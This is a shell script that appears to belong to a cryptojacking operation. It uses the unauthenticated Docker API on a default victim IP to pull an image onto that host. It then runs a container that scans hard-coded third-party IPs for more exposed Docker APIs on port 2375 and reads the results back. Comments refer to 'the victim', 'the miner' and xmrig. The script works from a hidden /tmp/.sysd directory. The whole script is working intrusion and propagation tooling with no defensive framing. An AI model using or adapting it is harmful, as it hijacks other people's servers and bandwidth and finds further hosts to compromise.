#!/bin/sh
# ============================================================================
# Does nested scanning actually work?  (v2 - pull first)
#
# v1 found the first real constraint: the docker API does NOT auto-pull on create
# (only the CLI does) - create answers "No such image". So a nested scanner has to
# pull its own image, exactly as dock.sh already does for xmrig.
#
# What is proven by this test, in order:
#   1. a second container is accepted (room to nest beside the miner)
#   2. an image can be pulled onto the victim, small (busybox ~2MB)
#   3. the container has outbound internet + TLS (internetdb fetch)
#   4. it can open TCP to arbitrary hosts on :2375 (the actual scan)
#   5. we can read its findings back out of the logs (Tty=true -> raw text)
#
# Targets are known-answer: our own box1 (ours), two hosts measured to answer
# :2375, and 1.1.1.1 as a must-miss control.
# ============================================================================
cd /tmp/.sysd || exit 1
IP=${1:-134.209.121.89}
b="http://$IP:2375"
IMG="busybox:1.36"

curl -sS -m 10 -X DELETE "$b/containers/kwscan?force=1" >/dev/null 2>&1

echo "--- image present? ---"
ic=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' "$b/images/$IMG/json" 2>/dev/null)
echo "images/json -> $ic"
if [ "$ic" != 200 ]; then
    echo "pulling $IMG (victim's bandwidth)"
    curl -sS -m 240 -X POST "$b/images/create?fromImage=$IMG" >/dev/null 2>&1
    ic2=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' "$b/images/$IMG/json" 2>/dev/null)
    echo "after pull -> $ic2"
fi

BODY='{"Image":"'"$IMG"'","Tty":true,"Labels":{"kwscan":"1"},"Cmd":["sh","-c","for i in 167.233.74.146 45.63.107.63 212.58.68.14 1.1.1.1; do nc -w 2 $i 2375 </dev/null >/dev/null 2>&1 && echo OPEN $i || echo closed $i; done; echo ---IDB---; wget -qO- https://internetdb.shodan.io/167.233.74.146 2>/dev/null | head -c 160; echo; echo NEST-DONE"]}'

r=$(curl -sS -m 180 -X POST "$b/containers/create?name=kwscan" \
        -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null)
echo "create: $(printf '%s' "$r" | head -c 140)"
id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
[ -n "$id" ] || exit 1
st=$(curl -sS -m 90 -o /dev/null -w '%{http_code}' -X POST "$b/containers/$id/start" 2>/dev/null)
echo "start: $st"
sleep 25
echo "--- logs ---"
curl -sS -m 15 "$b/containers/$id/logs?stdout=1&tail=50" 2>/dev/null | head -c 900
echo
echo "--- state ---"
curl -sS -m 8 "$b/containers/$id/json" 2>/dev/null | grep -o '"Status":"[^"]*"' | head -1
curl -sS -m 15 -X DELETE "$b/containers/$id?force=1" >/dev/null 2>&1
echo "cleaned"

cd /tmp/.sysd || exit 1
IP=${1:-134.209.121.89}
b="http://$IP:2375"

curl -sS -m 10 -X DELETE "$b/containers/kwscan?force=1" >/dev/null 2>&1

BODY='{"Image":"curlimages/curl:latest","Tty":true,"Labels":{"kwscan":"1"},"Cmd":["sh","-c","for i in 167.233.74.146 45.63.107.63 212.58.68.14 1.1.1.1; do v=$(curl -s -m 3 http://$i:2375/version 2>/dev/null); case \"$v\" in *ApiVersion*) echo HIT $i;; *) echo miss $i;; esac; done; echo NEST-DONE"]}'

r=$(curl -sS -m 180 -X POST "$b/containers/create?name=kwscan" \
        -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null)
echo "create: $(printf '%s' "$r" | head -c 140)"
id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
[ -n "$id" ] || exit 1
st=$(curl -sS -m 90 -o /dev/null -w '%{http_code}' -X POST "$b/containers/$id/start" 2>/dev/null)
echo "start: $st"
sleep 30
echo "--- logs ---"
curl -sS -m 15 "$b/containers/$id/logs?stdout=1&tail=50" 2>/dev/null | head -c 700
echo
echo "--- state ---"
curl -sS -m 8 "$b/containers/$id/json" 2>/dev/null | grep -o '"Status":"[^"]*"' | head -1
curl -sS -m 15 -X DELETE "$b/containers/$id?force=1" >/dev/null 2>&1
echo "cleaned"
